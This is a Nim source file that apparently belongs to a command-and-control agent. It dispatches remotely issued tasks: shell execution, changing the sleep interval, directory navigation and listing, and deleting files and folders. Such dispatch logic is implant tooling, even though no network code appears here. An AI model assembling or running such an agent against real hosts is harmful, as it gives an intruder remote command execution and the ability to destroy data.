import strutils
import ./types 
import ./commands/commands

proc handleTask*(task: Task, config: AgentConfig): TaskResult = 
    
    # Handle task command
    case task.command: 

    of ExecuteShell: 
        let taskResult = taskShell(task)
        echo taskResult.data
        return taskResult

    of Sleep:         
        # Execute task
        let taskResult = taskSleep(task)
        
        # Update sleep delay in agent config
        if taskResult.status == Completed: 
            config.sleep = parseInt(task.args[0])

        # Return result
        return taskResult

    of GetWorkingDirectory: 
        let taskResult = taskPwd(task)
        echo taskResult.data 
        return taskResult

    of SetWorkingDirectory:
        let taskResult = taskCd(task)
        echo taskResult.data
        return taskResult

    of ListDirectory:
        let taskResult = taskDir(task)
        echo taskResult.data
        return taskResult

    of RemoveFile:
        let taskResult = taskRm(task)
        echo taskResult.data
        return taskResult

    of RemoveDirectory:
        let taskResult = taskRmdir(task)
        echo taskResult.data
        return taskResult

    else: 
        echo "Not implemented"
        return nil 